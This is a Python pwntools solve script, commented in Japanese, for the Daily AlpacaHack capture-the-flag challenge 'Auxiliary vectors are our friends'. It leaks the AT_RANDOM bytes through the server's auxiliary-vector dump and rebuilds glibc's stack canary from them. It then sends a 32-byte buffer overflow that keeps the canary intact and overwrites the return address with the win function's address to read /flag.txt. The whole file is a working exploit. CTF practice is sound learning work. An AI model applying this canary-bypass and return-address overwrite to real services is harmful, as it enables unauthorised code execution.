#!/usr/bin/env python3
"""Auxiliary vectors are our friends (Daily AlpacaHack) の解法スクリプト。

使い方:
    python3 solve.py <HOST> <PORT>

問題ページでサーバーを起動 (Spawn) すると、接続先のホストとポートが表示されます。
それらを引数に指定して実行してください。pwntools が必要です。
"""

import sys

from pwn import *

context.arch = "amd64"

# 配布バイナリは No PIE でビルドされているため、win 関数のアドレスは常に固定です。
# (配布バイナリのシンボルテーブルで win = 0x40135f であることを確認しています)
WIN_ADDR = 0x40135f

# 問い合わせる auxiliary vector のタイプ。AT_RANDOM は、プロセス起動時に
# カーネルが用意した 16 バイトのランダムデータを指すポインタです。
AT_RANDOM = 25


def main() -> None:
    if len(sys.argv) != 3:
        print(f"Usage: python3 {sys.argv[0]} <HOST> <PORT>")
        sys.exit(1)
    host, port = sys.argv[1], int(sys.argv[2])

    io = remote(host, port)

    # 1. AT_RANDOM を指定して、指し先の 16 バイトをダンプさせる。
    #    サーバーは type に対する getauxval() の戻り値を表示したうえで、
    #    そのアドレスから 16 バイトを読めた場合は 16 進数で表示してくれます。
    io.sendlineafter(b"type> ", str(AT_RANDOM).encode())

    io.recvuntil(b"val: ")
    val = int(io.recvline().strip())
    log.info(f"AT_RANDOM points to {val:#x}")

    io.recvuntil(b"values: ")
    random_bytes = bytes.fromhex(io.recvline().strip().decode())
    log.info(f"random bytes: {random_bytes.hex()}")
    # サーバーは読み取れた分だけを 16 進数で表示する仕様のため、
    # 16 バイトそろっていることを確認します。
    assert len(random_bytes) == 16

    # 2. スタックカナリアを復元する。
    #    glibc は AT_RANDOM の先頭 8 バイトをカナリアの元として読み取り、
    #    最下位バイトを 0 にした値をカナリアとして使います。
    canary = u64(random_bytes[:8]) & 0xFFFFFFFFFFFFFF00
    log.success(f"canary = {canary:#x}")

    # 3. ペイロードを組み立てる (合計 32 バイト = read() の上限)。
    #    vuln() のスタックレイアウトは次の通りです。
    #      buf[8] | カナリア(8) | 保存された RBP(8) | リターンアドレス(8)
    #    カナリアの位置には復元した値をそのまま置くことで検査を通過し、
    #    リターンアドレスを win のアドレスに書き換えます。
    payload = b"A" * 8
    payload += p64(canary)
    payload += b"B" * 8  # 保存された RBP のダミー
    payload += p64(WIN_ADDR)

    io.sendlineafter(b"Please leave a message> ", payload)

    # 4. win() が /flag.txt を表示するので、残りの出力をすべて受け取る。
    data = io.recvall(timeout=3)
    print(data.decode(errors="ignore"))


if __name__ == "__main__":
    main()
